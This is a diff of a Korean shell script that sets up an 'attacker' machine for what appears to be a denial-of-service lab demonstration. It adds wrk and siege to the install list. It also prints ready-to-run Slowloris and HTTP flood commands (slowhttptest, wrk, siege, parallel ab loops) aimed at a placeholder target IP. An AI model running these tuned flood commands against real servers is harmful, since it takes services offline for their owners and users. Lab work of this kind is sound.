@@ -3,11 +3,13 @@
 # roles/attacker.sh - 부하/공격 도구 설치만 (실제 공격은 실행하지 않음)
 #   slowhttptest : Slowloris 계열 느린 요청 공격 도구
 #   apache2-utils: ab (ApacheBench) - 정상 부하/처리량 측정
+#   wrk          : 고성능 HTTP Flood(대량 요청) 도구
+#   siege        : HTTP 부하/플러드 도구(동시 사용자 시뮬)
 # 설치에는 root(sudo)가 필요하지만, 실제 공격 실행은 일반 사용자로 한다.
 set -euo pipefail
 
 # --- 1) 도구 설치 (멱등) ---
-for pkg in slowhttptest apache2-utils; do
+for pkg in slowhttptest apache2-utils wrk siege; do
   if dpkg -s "$pkg" >/dev/null 2>&1; then
     echo "[=] $pkg 이미 설치됨 - skip"
   else
@@ -21,7 +23,9 @@ echo
 echo "----- 자체 검증 (attacker) -----"
 slowhttptest -h 2>&1 | head -n1 || true
 ab -V | head -n1
-echo "[OK] slowhttptest / ab 설치 확인"
+wrk --version 2>&1 | head -n1 || true
+siege --version 2>&1 | head -n1 || true
+echo "[OK] slowhttptest / ab / wrk / siege 설치 확인"
 
 # --- 3) 참고: 데모용 공격 명령 (여기서 실행하지 않음. README 데모 순서 참고) ---
 cat <<'TIP'
@@ -30,9 +34,13 @@ cat <<'TIP'
   # (1) Slowloris - 느린 헤더로 커넥션 고갈 (저대역폭, victim 다운에 가장 확실)
   slowhttptest -c 500 -H -i 10 -r 200 -t GET -u http://<대상-IP>/ -x 24 -p 3
 
-  # (2) HTTP Flood - 대량 요청 (사양 낮춘 victim OOM / 처리량 비교)
+  # (2) HTTP Flood - 대량 요청 (CPU/RAM 부하, 처리량 비교)
+  #  wrk: 4스레드 400커넥션 30초 (고성능)
+  wrk -t4 -c400 -d30s http://<대상-IP>/
+  #  siege: 동시 사용자 300명 30초
+  siege -b -c 300 -t 30S http://<대상-IP>/
+  #  ab: 20만 요청 500동시 (병렬로 더 세게)
   ab -n 200000 -c 500 -k http://<대상-IP>/
-  #  더 세게(병렬):
   for i in 1 2 3 4; do ab -n 100000 -c 300 -k http://<대상-IP>/ & done; wait
 
   # (3) 정상 부하 측정 (대조)
